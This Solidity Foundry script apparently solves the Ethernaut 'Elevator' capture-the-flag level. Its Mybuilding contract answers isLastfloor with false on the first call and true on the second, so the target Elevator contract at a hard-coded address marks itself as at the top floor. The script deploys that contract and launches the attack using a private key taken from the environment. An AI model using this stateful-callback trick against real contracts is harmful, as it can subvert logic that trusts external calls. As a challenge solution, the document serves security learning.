// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Elevator.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Mybuilding{

    bool private mySwitch;   //intial stage == false 
    Elevator public ElevatorInstance = Elevator(0x95d5922FF89e8b42707625039cB7773A12e1ddB1);

    function startAttack() external {
        ElevatorInstance.goTo(0);
    }
   
   //with this fucntion, we can able to reach inside the (isLAstfloor) contract    
   function isLastfloor(uint _floor) external returns(bool) {

        if(!mySwitch){
            mySwitch = true;
            return false;
           } else{
            return true;
       }  
    }
}

contract ElevatorSolution is Script {   

    
    function run() external {
 
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
       Mybuilding mybuilding = new Mybuilding();
       mybuilding.startAttack();
      vm.stopBroadcast();
    }

}